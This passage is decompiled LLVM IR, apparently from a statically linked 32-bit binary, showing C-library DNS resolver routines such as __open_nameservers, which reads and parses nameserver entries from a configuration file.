  store i32 %v2_805548d, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_805548d, align 4
  %v0_8055490 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055490, i32* %v1_805548c, align 4
  %v3_8055491 = call i32 @__pthread_return_void(i32 %v1_8055435.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8055491, i32* %eax.global-to-local, align 4
  %v0_8055496 = load i32, i32* @esp, align 4
  %v1_8055496 = add i32 %v0_8055496, 32
  %v2_8055496 = inttoptr i32 %v1_8055496 to i32*
  store i32 -1, i32* %v2_8055496, align 4
  br label %dec_label_pc_805549e

dec_label_pc_805549e:                             ; preds = %dec_label_pc_8055312, %dec_label_pc_8055454
  %v0_805549e = load i32, i32* @esp, align 4
  %v1_805549e = add i32 %v0_805549e, 16
  br label %dec_label_pc_80554a1

dec_label_pc_80554a1:                             ; preds = %dec_label_pc_805542e, %dec_label_pc_805549e
  %v0_80554a1 = phi i32 [ %v0_805544d, %dec_label_pc_805542e ], [ %v1_805549e, %dec_label_pc_805549e ]
  %v1_80554a1 = add i32 %v0_80554a1, 16
  %v2_80554a1 = inttoptr i32 %v1_80554a1 to i32*
  %v3_80554a1 = load i32, i32* %v2_80554a1, align 4
  store i32 %v3_80554a1, i32* %eax.global-to-local, align 4
  %v1_80554a5 = add i32 %v0_80554a1, 220
  %v1_80554ab = inttoptr i32 %v1_80554a5 to i32*
  %v2_80554ab = load i32, i32* %v1_80554ab, align 4
  store i32 %v2_80554ab, i32* @ebx, align 4
  %v3_80554ab = add i32 %v0_80554a1, 224
  %v1_80554ac = inttoptr i32 %v3_80554ab to i32*
  %v2_80554ac = load i32, i32* %v1_80554ac, align 4
  store i32 %v2_80554ac, i32* @esi, align 4
  %v3_80554ac = add i32 %v0_80554a1, 228
  %v1_80554ad = inttoptr i32 %v3_80554ac to i32*
  %v2_80554ad = load i32, i32* %v1_80554ad, align 4
  store i32 %v2_80554ad, i32* @edi, align 4
  %v3_80554ad = add i32 %v0_80554a1, 232
  %v1_80554ae = inttoptr i32 %v3_80554ad to i32*
  %v2_80554ae = load i32, i32* %v1_80554ae, align 4
  store i32 %v2_80554ae, i32* @ebp, align 4
  ret i32 %v3_80554a1

; uselistorder directives
  uselistorder i32 %v0_80554a1, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055478, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805544d, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_805542e, { 1, 0 }
  uselistorder i32 %v1_8055435.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_80553e0.pre, { 1, 0 }
  uselistorder i32 %v5_80553b3, { 1, 0 }
  uselistorder i32 %v3_80553b3, { 2, 0, 1, 3 }
  uselistorder i32 %v1_805537b, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8055344, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8055312, { 1, 0 }
  uselistorder i32 %v3_80552f1, { 1, 0, 2 }
  uselistorder i32 %v0_80552e2, { 1, 0 }
  uselistorder i32 %v5_80552d8, { 1, 0 }
  uselistorder i32* %v3_80552d8, { 1, 0 }
  uselistorder i32 %v0_80551ae81, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_80552d8, { 2, 1, 0 }
  uselistorder i32 %v5_80552d2, { 1, 0 }
  uselistorder i32 %v1_80552d1, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80552cd, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8055291, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_805526b, { 1, 0 }
  uselistorder i32 %v1_805525c, { 1, 0 }
  uselistorder i32 %v0_805521b, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_80551c2, { 1, 2, 0 }
  uselistorder i32 %v0_80551c2, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_805519c, { 1, 0 }
  uselistorder i32 %v1_8055196, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8055191, { 1, 2, 0 }
  uselistorder i32 %v5_805519c58, { 1, 0 }
  uselistorder i32 %v5_805513e, { 1, 0 }
  uselistorder i32 %v3_805513e, { 2, 0, 1, 3 }
  uselistorder i32 %v3_80550f6, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80550dc, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_80550dc, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_80550bb, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_805509b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8055041, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8055026, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_805500f, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8054f97, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8054f84, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8054f4a, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8054f2b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8054f0f, { 1, 0 }
  uselistorder i32 %v3_8054f04, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8054f01, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8054ea6, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8054ea1, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8054e8a, { 1, 0 }
  uselistorder i32 %v1_8054e56, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8054e4792, { 2, 1, 0 }
  uselistorder i32 %v3_8054e5f, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i16 %v0_8054e07, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_8054e00, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_8054d72, { 6, 9, 1, 10, 8, 5, 2, 11, 0, 3, 4, 7, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 78, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 65, 62, 63, 64, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84 }
  uselistorder i32 51, { 2, 1, 0 }
  uselistorder i32 160, { 0, 2, 1, 3 }
  uselistorder i32 68, { 6, 0, 3, 4, 5, 1, 2 }
  uselistorder i32 27, { 2, 3, 1, 0 }
  uselistorder i32 67, { 1, 2, 0 }
  uselistorder i32 112, { 1, 5, 6, 7, 3, 4, 2, 0 }
  uselistorder i32 88, { 1, 2, 0 }
  uselistorder i32 72, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 101, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 5, 4, 3, 6, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 9, 8, 7, 6, 5, 4, 3, 2, 10, 0 }
  uselistorder i32 17, { 19, 17, 11, 16, 6, 7, 4, 12, 13, 14, 15, 0, 20, 10, 2, 1, 5, 18, 8, 9, 3 }
  uselistorder i32 176, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 3, 5, 4, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 16, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 53, 54, 51, 52, 55, 56 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 3, 0, 4, 2, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 84, { 5, 1, 6, 2, 4, 3, 0 }
  uselistorder i32 -12, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 10, 51, 50, 49, 16, 17, 11, 12, 13, 14, 15, 18, 19, 0, 20, 52, 26, 23, 21, 22, 24, 25, 27, 31, 32, 33, 29, 28, 30, 34, 40, 41, 39, 38, 37, 35, 36, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 -8, { 10, 4, 3, 5, 2, 6, 7, 8, 9, 11, 50, 45, 48, 46, 49, 51, 52, 47, 17, 18, 12, 13, 14, 15, 16, 19, 20, 21, 22, 24, 0, 23, 1, 25, 27, 28, 26, 29, 30, 31, 32, 37, 38, 36, 35, 34, 33, 39, 40, 41, 42, 43, 44 }
  uselistorder i32 (i32)* @__libc_close, { 16, 15, 14, 17, 25, 24, 23, 22, 21, 20, 19, 18, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -16, { 27, 28, 29, 18, 20, 21, 17, 19, 16, 22, 15, 23, 24, 25, 26, 30, 98, 99, 36, 37, 31, 32, 33, 34, 35, 38, 39, 14, 40, 41, 53, 48, 49, 45, 46, 47, 50, 3, 1, 2, 4, 5, 51, 44, 6, 52, 42, 43, 0, 54, 55, 56, 61, 62, 63, 64, 65, 60, 58, 57, 59, 7, 66, 8, 9, 69, 70, 71, 68, 72, 73, 67, 74, 10, 11, 87, 88, 89, 84, 85, 86, 83, 82, 81, 80, 79, 75, 76, 77, 78, 90, 12, 13, 91, 92, 93, 94, 95, 96, 97 }
  uselistorder i16* @global_var_8061544.789, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 2, 0, 3 }
  uselistorder i64* @global_var_8067800.788, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80677e8.787 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_80677e8.787, { 1, 0 }
  uselistorder i32 1025, { 5, 6, 7, 1, 2, 0, 4, 3 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80554a1, { 1, 0 }
  uselistorder label %dec_label_pc_805549e, { 1, 0 }
  uselistorder label %dec_label_pc_805542e, { 1, 0 }
  uselistorder label %dec_label_pc_8055418, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055405, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_80553e0.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80553d8, { 1, 0 }
  uselistorder label %dec_label_pc_80553bf, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8055374, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8055312, { 1, 0 }
  uselistorder label %dec_label_pc_80552e2, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_80552d8, { 1, 0 }
  uselistorder label %dec_label_pc_80552cd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80552ca, { 1, 0 }
  uselistorder label %dec_label_pc_8055245, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805518d, { 1, 0 }
  uselistorder label %dec_label_pc_805500f, { 1, 0 }
  uselistorder label %dec_label_pc_8054fd8, { 1, 0 }
  uselistorder label %dec_label_pc_8054f4a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054e56, { 1, 0 }
  uselistorder label %dec_label_pc_8054e40, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_80554b0 = load i32, i32* @ebp, align 4
  store i32 134560279, i32* %stack_var_-216, align 4
  %v3_80554bf = ptrtoint i32* %stack_var_-216 to i32
  %v2_80554c4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80554c4, i32* @eax, align 4
  %v2_80554cc = call i32 @__pthread_return_void(i32 %v2_80554c4, i32 134560279)
  %v1_80554d8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061548.726 to i32))
  store i32 %v1_80554d8, i32* @eax, align 4
  %v0_80554e0 = load i32, i32* @global_var_8067c34.727, align 4
  %tmp43 = icmp slt i32 %v0_80554e0, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_80556d7, label %dec_label_pc_80554ed

dec_label_pc_80554ed:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_8060f70.792 to i32), i32* %stack_var_-216, align 4
  %v2_80554f9 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_8060f3e.793 to i32), i32 ptrtoint (i32* @global_var_8060f70.792 to i32))
  store i32 %v2_80554f9, i32* @eax, align 4
  store i32 %v2_80554f9, i32* @ebp, align 4
  %v1_8055503 = icmp eq i32 %v2_80554f9, 0
  %v1_8055505 = icmp eq i1 %v1_8055503, false
  br i1 %v1_8055505, label %dec_label_pc_80556a2.preheader, label %dec_label_pc_805550b

dec_label_pc_805550b:                             ; preds = %dec_label_pc_80554ed
  store i32 ptrtoint (i32* @global_var_8060f70.792 to i32), i32* %stack_var_-216, align 4
  %v2_8055517 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_8060f4f.794 to i32), i32 ptrtoint (i32* @global_var_8060f70.792 to i32))
  store i32 %v2_8055517, i32* @ebp, align 4
  %v1_8055521 = icmp eq i32 %v2_8055517, 0
  %v1_8055523 = icmp eq i1 %v1_8055521, false
  br i1 %v1_8055523, label %dec_label_pc_80556a2.preheader, label %dec_label_pc_80556cc

dec_label_pc_80556a2.preheader:                   ; preds = %dec_label_pc_80554ed, %dec_label_pc_805550b
  %v2_80556a9 = ptrtoint i32* %stack_var_-180 to i32
  %v3_80555dd = add i32 %v3_80554bf, 164
  %v0_80556a2103 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_80556a9, i32* @ebx, align 4
  %v3_80556ae104 = call i32 @fgets(i32 %v2_80556a9, i32 128, i32 %v0_80556a2103)
  store i32 %v3_80556ae104, i32* @eax, align 4
  %v1_80556b6105 = icmp eq i32 %v3_80556ae104, 0
  %v1_80556b8106 = icmp eq i1 %v1_80556b6105, false
  br i1 %v1_80556b8106, label %dec_label_pc_805552f.preheader.lr.ph, label %dec_label_pc_80556be

dec_label_pc_805552f.preheader.lr.ph:             ; preds = %dec_label_pc_80556a2.preheader
  %v4_80555c7 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_805552f.preheader

dec_label_pc_805552e:                             ; preds = %dec_label_pc_8055539
  %v1_805552e = add i32 %v0_805552e57, 1
  store i32 %v1_805552e, i32* @ebx, align 4
  %v1_805552f = inttoptr i32 %v1_805552e to i8*
  %v2_805552f = load i8, i8* %v1_805552f, align 1
  %v3_805552f = zext i8 %v2_805552f to i32
  %v5_805552f = and i32 %v6_805552f60, -256
  %v6_805552f = or i32 %v3_805552f, %v5_805552f
  store i32 %v6_805552f, i32* @ecx, align 4
  %v4_8055531 = icmp eq i8 %v2_805552f, 0
  br i1 %v4_8055531, label %dec_label_pc_80556a2.backedge, label %dec_label_pc_8055539

dec_label_pc_8055539:                             ; preds = %dec_label_pc_8055539.lr.ph, %dec_label_pc_805552e
  %v6_805552f60 = phi i32 [ %v6_805552f55, %dec_label_pc_8055539.lr.ph ], [ %v6_805552f, %dec_label_pc_805552e ]
  %v2_805552f59 = phi i8 [ %v2_805552f52, %dec_label_pc_8055539.lr.ph ], [ %v2_805552f, %dec_label_pc_805552e ]
  %v1_805552f58 = phi i8* [ %v1_805552f51, %dec_label_pc_8055539.lr.ph ], [ %v1_805552f, %dec_label_pc_805552e ]
  %v0_805552e57 = phi i32 [ %v0_805552f.pre, %dec_label_pc_8055539.lr.ph ], [ %v1_805552e, %dec_label_pc_805552e ]
  %v2_8055539 = sext i8 %v2_805552f59 to i32
  store i32 %v2_8055539, i32* @edx, align 4
  store i32 %v0_805553c.pre, i32* @eax, align 4
  %v2_8055541 = mul nsw i32 %v2_8055539, 2
  %v3_8055541 = add i32 %v0_805553c.pre, %v2_8055541
  %v4_8055541 = inttoptr i32 %v3_8055541 to i8*
  %v5_8055541 = load i8, i8* %v4_8055541, align 1
  %v6_8055541 = and i8 %v5_8055541, 32
  %v7_8055541 = icmp eq i8 %v6_8055541, 0
  %v1_8055545 = icmp eq i1 %v7_8055541, false
  br i1 %v1_8055545, label %dec_label_pc_805552e, label %dec_label_pc_8055547

dec_label_pc_8055547:                             ; preds = %dec_label_pc_8055539
  %v10_8055547 = icmp eq i8 %v2_805552f59, 10
  br i1 %v10_8055547, label %dec_label_pc_80556a2.backedge, label %dec_label_pc_8055550

dec_label_pc_80556a2.backedge:                    ; preds = %dec_label_pc_805552f.preheader, %dec_label_pc_805552e, %dec_label_pc_8055668, %dec_label_pc_8055697, %dec_label_pc_805566f, %dec_label_pc_8055547, %dec_label_pc_8055550, %dec_label_pc_8055621
  %v0_80556a2 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_80556a9, i32* @ebx, align 4
  %v3_80556ae = call i32 @fgets(i32 %v2_80556a9, i32 128, i32 %v0_80556a2)
  store i32 %v3_80556ae, i32* @eax, align 4
  %v1_80556b6 = icmp eq i32 %v3_80556ae, 0
  %v1_80556b8 = icmp eq i1 %v1_80556b6, false
  br i1 %v1_80556b8, label %dec_label_pc_805552f.preheader, label %dec_label_pc_80556be

dec_label_pc_8055550:                             ; preds = %dec_label_pc_8055547
  %v10_8055558 = icmp eq i8 %v2_805552f59, 35
  %v1_805555b = icmp eq i1 %v10_8055558, false
  br i1 %v1_805555b, label %dec_label_pc_80555ac.preheader, label %dec_label_pc_80556a2.backedge

dec_label_pc_80555ac.preheader:                   ; preds = %dec_label_pc_8055550
  %v2_80555ac6 = load i8, i8* %v1_805552f58, align 1
  %v3_80555ac7 = icmp eq i8 %v2_80555ac6, 0
  br i1 %v3_80555ac7, label %dec_label_pc_80555b8, label %dec_label_pc_80555b1

dec_label_pc_8055562:                             ; preds = %dec_label_pc_80555b1
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_8055566 = load i32, i32* @esp, align 4
  %v3_8055566 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_8055566 = add nuw nsw i32 %v3_8055566, 152
  %v5_8055566 = add i32 %v4_8055566, %v1_8055566
  %v6_8055566 = inttoptr i32 %v5_8055566 to i32*
  store i32 %v0_8055566, i32* %v6_8055566, align 4
  %v0_8055570.pre = load i32, i32* @ebx, align 4
  %v4_8055570.pre = load i32, i32* @ecx, align 4
  %v1_805557061 = inttoptr i32 %v0_8055570.pre to i8*
  %v2_805557062 = load i8, i8* %v1_805557061, align 1
  %v3_805557063 = zext i8 %v2_805557062 to i32
  %v5_805557064 = and i32 %v4_8055570.pre, -256
  %v6_805557065 = or i32 %v3_805557063, %v5_805557064
  %v4_805557266 = icmp eq i8 %v2_805557062, 0
  br i1 %v4_805557266, label %dec_label_pc_805558f.preheader, label %dec_label_pc_8055576.lr.ph

dec_label_pc_8055576.lr.ph:                       ; preds = %dec_label_pc_8055562
  %v0_8055579.pre = load i32, i32* @global_var_80612cc, align 4
  br label %dec_label_pc_8055576

dec_label_pc_805556f:                             ; preds = %dec_label_pc_8055584
  %v1_805556f = add i32 %v0_805556f67, 1
  store i32 %v1_805556f, i32* @ebx, align 4
  %v1_8055570 = inttoptr i32 %v1_805556f to i8*
  %v2_8055570 = load i8, i8* %v1_8055570, align 1
  %v3_8055570 = zext i8 %v2_8055570 to i32
  %v5_8055570 = and i32 %v6_805557069, -256
  %v6_8055570 = or i32 %v3_8055570, %v5_8055570
  %v4_8055572 = icmp eq i8 %v2_8055570, 0
  br i1 %v4_8055572, label %dec_label_pc_805558f.preheader, label %dec_label_pc_8055576

dec_label_pc_8055576:                             ; preds = %dec_label_pc_8055576.lr.ph, %dec_label_pc_805556f
  %v6_805557069 = phi i32 [ %v6_805557065, %dec_label_pc_8055576.lr.ph ], [ %v6_8055570, %dec_label_pc_805556f ]
  %v2_805557068 = phi i8 [ %v2_805557062, %dec_label_pc_8055576.lr.ph ], [ %v2_8055570, %dec_label_pc_805556f ]
  %v0_805556f67 = phi i32 [ %v0_8055570.pre, %dec_label_pc_8055576.lr.ph ], [ %v1_805556f, %dec_label_pc_805556f ]
  %v2_8055576 = sext i8 %v2_805557068 to i32
  store i32 %v2_8055576, i32* @edx, align 4
  store i32 %v0_8055579.pre, i32* @eax, align 4
  %v2_805557e = mul nsw i32 %v2_8055576, 2
  %v3_805557e = add i32 %v0_8055579.pre, %v2_805557e
  %v4_805557e = inttoptr i32 %v3_805557e to i8*
  %v5_805557e = load i8, i8* %v4_805557e, align 1
  %v6_805557e = and i8 %v5_805557e, 32
  %v7_805557e = icmp eq i8 %v6_805557e, 0
  %v1_8055582 = icmp eq i1 %v7_805557e, false
  br i1 %v1_8055582, label %dec_label_pc_805558f.preheader, label %dec_label_pc_8055584

dec_label_pc_8055584:                             ; preds = %dec_label_pc_8055576
  %v10_8055584 = icmp eq i8 %v2_805557068, 10
  %v1_8055587 = icmp eq i1 %v10_8055584, false
  br i1 %v1_8055587, label %dec_label_pc_805556f, label %dec_label_pc_805558f.preheader

dec_label_pc_805558f.preheader:                   ; preds = %dec_label_pc_8055584, %dec_label_pc_8055576, %dec_label_pc_805556f, %dec_label_pc_8055562
  %v0_805556f.lcssa = phi i32 [ %v0_8055570.pre, %dec_label_pc_8055562 ], [ %v1_805556f, %dec_label_pc_805556f ], [ %v0_805556f67, %dec_label_pc_8055576 ], [ %v0_805556f67, %dec_label_pc_8055584 ]
  %v6_8055570.lcssa = phi i32 [ %v6_805557065, %dec_label_pc_8055562 ], [ %v6_8055570, %dec_label_pc_805556f ], [ %v6_805557069, %dec_label_pc_8055576 ], [ %v6_805557069, %dec_label_pc_8055584 ]
  %v1_805558f75 = inttoptr i32 %v0_805556f.lcssa to i8*
  %v2_805558f76 = load i8, i8* %v1_805558f75, align 1
  %v3_805558f77 = zext i8 %v2_805558f76 to i32
  %v5_805558f78 = and i32 %v6_8055570.lcssa, -256
  %v6_805558f79 = or i32 %v3_805558f77, %v5_805558f78
  store i32 %v6_805558f79, i32* @ecx, align 4
  %v4_805559180 = icmp eq i8 %v2_805558f76, 0
  br i1 %v4_805559180, label %dec_label_pc_80555a8, label %dec_label_pc_8055595

dec_label_pc_805558b:                             ; preds = %dec_label_pc_80555a3, %dec_label_pc_8055595
  store i8 0, i8* %v1_805558f82, align 1
  %v0_805558e = load i32, i32* @ebx, align 4
  %v1_805558e = add i32 %v0_805558e, 1
  store i32 %v1_805558e, i32* @ebx, align 4
  %v4_805558f.pre = load i32, i32* @ecx, align 4
  %v1_805558f = inttoptr i32 %v1_805558e to i8*
  %v2_805558f = load i8, i8* %v1_805558f, align 1
  %v3_805558f = zext i8 %v2_805558f to i32
  %v5_805558f = and i32 %v4_805558f.pre, -256
  %v6_805558f = or i32 %v3_805558f, %v5_805558f
  store i32 %v6_805558f, i32* @ecx, align 4
  %v4_8055591 = icmp eq i8 %v2_805558f, 0
  br i1 %v4_8055591, label %dec_label_pc_80555a8, label %dec_label_pc_8055595

dec_label_pc_8055595:                             ; preds = %dec_label_pc_805558f.preheader, %dec_label_pc_805558b
  %v2_805558f83 = phi i8 [ %v2_805558f, %dec_label_pc_805558b ], [ %v2_805558f76, %dec_label_pc_805558f.preheader ]
  %v1_805558f82 = phi i8* [ %v1_805558f, %dec_label_pc_805558b ], [ %v1_805558f75, %dec_label_pc_805558f.preheader ]
  %v0_80555ac81 = phi i32 [ %v1_805558e, %dec_label_pc_805558b ], [ %v0_805556f.lcssa, %dec_label_pc_805558f.preheader ]
  %v2_8055595 = sext i8 %v2_805558f83 to i32
  store i32 %v2_8055595, i32* @edx, align 4
  %v0_8055598 = load i32, i32* @global_var_80612cc, align 4
  store i32 %v0_8055598, i32* @eax, align 4
  %v2_805559d = mul nsw i32 %v2_8055595, 2
  %v3_805559d = add i32 %v0_8055598, %v2_805559d
  %v4_805559d = inttoptr i32 %v3_805559d to i8*
  %v5_805559d = load i8, i8* %v4_805559d, align 1
  %v6_805559d = and i8 %v5_805559d, 32
  %v7_805559d = icmp eq i8 %v6_805559d, 0
  %v1_80555a1 = icmp eq i1 %v7_805559d, false
  br i1 %v1_80555a1, label %dec_label_pc_805558b, label %dec_label_pc_80555a3

dec_label_pc_80555a3:                             ; preds = %dec_label_pc_8055595
  %v10_80555a3 = icmp eq i8 %v2_805558f83, 10
  br i1 %v10_80555a3, label %dec_label_pc_805558b, label %dec_label_pc_80555a8

dec_label_pc_80555a8:                             ; preds = %dec_label_pc_805558b, %dec_label_pc_80555a3, %dec_label_pc_805558f.preheader
  %v0_80555ac.lcssa = phi i32 [ %v0_805556f.lcssa, %dec_label_pc_805558f.preheader ], [ %v0_80555ac81, %dec_label_pc_80555a3 ], [ %v1_805558e, %dec_label_pc_805558b ]
  %v1_805558f.lcssa = phi i8* [ %v1_805558f75, %dec_label_pc_805558f.preheader ], [ %v1_805558f82, %dec_label_pc_80555a3 ], [ %v1_805558f, %dec_label_pc_805558b ]
  %v4_80555a8 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_80555ac = load i8, i8* %v1_805558f.lcssa, align 1
  %v3_80555ac = icmp eq i8 %v2_80555ac, 0
  br i1 %v3_80555ac, label %dec_label_pc_80555b8, label %dec_label_pc_80555b1

dec_label_pc_80555b1:                             ; preds = %dec_label_pc_80555ac.preheader, %dec_label_pc_80555a8
  %v0_8055566 = phi i32 [ %v0_80555ac.lcssa, %dec_label_pc_80555a8 ], [ %v0_805552e57, %dec_label_pc_80555ac.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_80555a8, %dec_label_pc_80555a8 ], [ 0, %dec_label_pc_80555ac.preheader ]
  %v7_80555b6 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_80555b6, label %dec_label_pc_80555b8, label %dec_label_pc_8055562

dec_label_pc_80555b8:                             ; preds = %dec_label_pc_80555a8, %dec_label_pc_80555b1, %dec_label_pc_80555ac.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_80555ac.preheader ], [ %v4_80555a8, %dec_label_pc_80555a8 ], [ %stack_var_-196.013, %dec_label_pc_80555b1 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_80555bf = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8060f67.795 to i32), i32* %stack_var_-216, align 4
  %v5_80555c7 = call i32 @__GI_strcoll(i8* %v4_80555c7, i32 ptrtoint ([11 x i8]* @global_var_8060f67.795 to i32), i32 %v0_80555bf, i32 %v0_80555bf)
  store i32 %v5_80555c7, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_80555d4 = icmp eq i32 %v5_80555c7, 0
  br i1 %v1_80555d4, label %dec_label_pc_80555fc.preheader, label %dec_label_pc_805560d

dec_label_pc_80555fc.preheader:                   ; preds = %dec_label_pc_80555b8
  %v5_805560090 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_805560090, label %dec_label_pc_8055602.lr.ph, label %dec_label_pc_805560d

dec_label_pc_8055602.lr.ph:                       ; preds = %dec_label_pc_80555fc.preheader
  %v0_8055602.pre = load i32, i32* @global_var_8067c34.727, align 4
  br label %dec_label_pc_8055602

dec_label_pc_80555da:                             ; preds = %dec_label_pc_8055602
  %v2_80555dd = mul i32 %v1_80555dd91, 4
  %v4_80555dd = add i32 %v2_80555dd, %v3_80555dd
  %v5_80555dd = inttoptr i32 %v4_80555dd to i32*
  %v6_80555dd = load i32, i32* %v5_80555dd, align 4
  %v1_80555e4 = inttoptr i32 %v6_80555dd to i8*
  %v2_80555e4 = call i32 @__GI_strdup(i8* %v1_80555e4)
  %v0_80555e9 = load i32, i32* @esi, align 4
  %v1_80555e9 = add i32 %v0_80555e9, 1
  store i32 %v1_80555e9, i32* @esi, align 4
  %v1_80555ea = load i32, i32* @ebx, align 4
  %v2_80555ea = mul i32 %v1_80555ea, 4
  %v3_80555ea = add i32 %v2_80555ea, 134642728
  %v4_80555ea = inttoptr i32 %v3_80555ea to i32*
  store i32 %v2_80555e4, i32* %v4_80555ea, align 4
  %v0_80555f1 = load i32, i32* @ebx, align 4
  %v1_80555f1 = add i32 %v0_80555f1, 1
  store i32 %v1_80555f1, i32* @eax, align 4
  store i32 %v1_80555f1, i32* @global_var_8067c34.727, align 4
